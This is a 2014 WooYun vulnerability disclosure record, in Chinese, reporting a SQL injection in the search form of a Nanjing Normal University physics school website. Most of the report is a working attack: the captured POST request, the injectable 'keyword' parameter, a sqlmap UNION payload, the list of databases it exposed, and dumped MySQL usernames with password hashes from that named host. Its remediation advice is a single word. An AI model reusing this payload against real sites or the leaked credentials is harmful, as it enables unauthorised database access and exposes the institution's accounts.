{"id": 56121, "wybug_id": "wooyun-2014-058828", "wybug_title": "南京师范大学物理科学与技术学院sql注入漏洞", "wybug_corp": "南京师范大学", "wybug_author": "bitcoin", "wybug_date": "2014-04-28 23:39", "wybug_open_date": "2014-05-03 23:40", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "13", "wybug_status": "已交由第三方合作机构(CCERT教育网应急响应组)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["数字类型注射", "注射技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-04-28：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-05-03：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 南京师范大学物理科学与技术学院sql注入漏洞 详细说明：  该漏洞为post注入漏洞，具体存在于页面http://physics.njnu.edu.cn/reports.php?typeid=&page=2的关键词搜索处，搜素1111抓包POST /search.php HTTP/1.1Host: physics.njnu.edu.cnProxy-Connection: keep-aliveContent-Length: 33Cache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Origin: http://physics.njnu.edu.cnUser-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.57 Safari/537.36Content-Type: application/x-www-form-urlencodedReferer: http://physics.njnu.edu.cn/reports.php?typeid=&page=2Accept-Encoding: gzip,deflate,sdchAccept-Language: zh-CN,zh;q=0.8keyword=1111&login=+%CB%D1%CB%F7+得到是对参数keyword过滤不严，导致注入请出sqlmapPlace: POSTParameter: keyword    Type: UNION query    Title: MySQL UNION query (NULL) - 10 columns    Payload: keyword=1111' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x7167706771,0x4250766c726d514c6f6a,0x71786a6a71),NULL,NULL,NULL,NULL#&login= %CB%D1%CB%F7---web server operating system: Linux CentOS 5.10web application technology: Apache 2.2.3, PHP 5.1.6back-end DBMS: MySQL 5available databases [18]:[*] 94_2012[*] aosai[*] bysj[*] cps2011[*] cscsp5th[*] hep10th[*] information_schema[*] mysql[*] optelec[*] physics[*] School[*] temp[*] test[*] ultrax[*] UniAddressBook[*] wky[*] xmmsdss[*] zzqDatabase: mysql[17 tables]+---------------------------+| user                      || columns_priv              || db                        || func                      || help_category             || help_keyword              || help_relation             || help_topic                || host                      || proc                      || procs_priv                || tables_priv               || time_zone                 || time_zone_leap_second     || time_zone_name            || time_zone_transition      || time_zone_transition_type |+---------------------------+Database: mysqlTable: user[31 columns]+-----------------------+-----------------------------------+| Column                | Type                              |+-----------------------+-----------------------------------+| User                  | varchar(16)                       || Alter_priv            | enum('N','Y')                     || Create_priv           | enum('N','Y')                     || Create_tmp_table_priv | enum('N','Y')                     || Delete_priv           | enum('N','Y')                     || Drop_priv             | enum('N','Y')                     || Execute_priv          | enum('N','Y')                     || File_priv             | enum('N','Y')                     || Grant_priv            | enum('N','Y')                     || Host                  | varchar(60)                       || Index_priv            | enum('N','Y')                     || Insert_priv           | enum('N','Y')                     || Lock_tables_priv      | enum('N','Y')                     || max_connections       | int(11) unsigned                  || max_questions         | int(11) unsigned                  || max_updates           | int(11) unsigned                  || Password              | varchar(41)                       || Process_priv          | enum('N','Y')                     || References_priv       | enum('N','Y')                     || Reload_priv           | enum('N','Y')                     || Repl_client_priv      | enum('N','Y')                     || Repl_slave_priv       | enum('N','Y')                     || Select_priv           | enum('N','Y')                     || Show_db_priv          | enum('N','Y')                     || Shutdown_priv         | enum('N','Y')                     || ssl_cipher            | blob                              || ssl_type              | enum('','ANY','X509','SPECIFIED') || Super_priv            | enum('N','Y')                     || Update_priv           | enum('N','Y')                     || x509_issuer           | blob                              || x509_subject          | blob                              |+-----------------------+-----------------------------------+Database: mysqlTable: user[6 entries]+--------+------------------+| User   | Password         |+--------+------------------+| aosai  | 43cb0d5871fee314 || root   | 42dee8e619a15467 || root   | 42dee8e619a15467 || ultrax | 49a63e205da6feef || weixin | 43cb0d5871fee314 || wky    | 0abc35bf30d4d20b |+--------+------------------+   漏洞证明：  如上   修复方案：  过滤   版权声明：转载请注明来源 bitcoin@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2014-05-03 23:40 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}